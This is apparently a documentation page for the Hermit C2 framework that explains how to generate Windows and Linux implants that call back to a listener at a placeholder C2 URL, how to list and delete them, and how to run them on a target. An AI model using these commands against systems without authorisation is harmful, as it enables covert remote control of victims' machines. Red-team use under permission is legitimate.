+++
title = "Implant"
date = 2024-01-11
[extra]
toc=true
+++

## Generate

You can generate implants with `implant gen` command with specifying the listener URL (`-u`) that you've started the previous section. The agent will connect to this listener URL.

- Windows target

```sh
Hermit $ implant gen -u https://my-c2-server.com:4443/ -o windows -f exe
```

- Linux target

```sh
Hermit $ implant gen -u https://my-c2-server.com:4443/ -o linux -f elf
```

<br />

## List Implants

The `implants` (or `implant list`) command displays the generated implants.

```sh
Hermit $ implants
```

Now you need to transfer this implant to the target computer and execute it.

<br />

## Delete

```sh
Hermit $ implant delete 1
```

If you want to delete all implants, specify `all` to the second argument as below:

```sh
Hermit $ implant delete all
```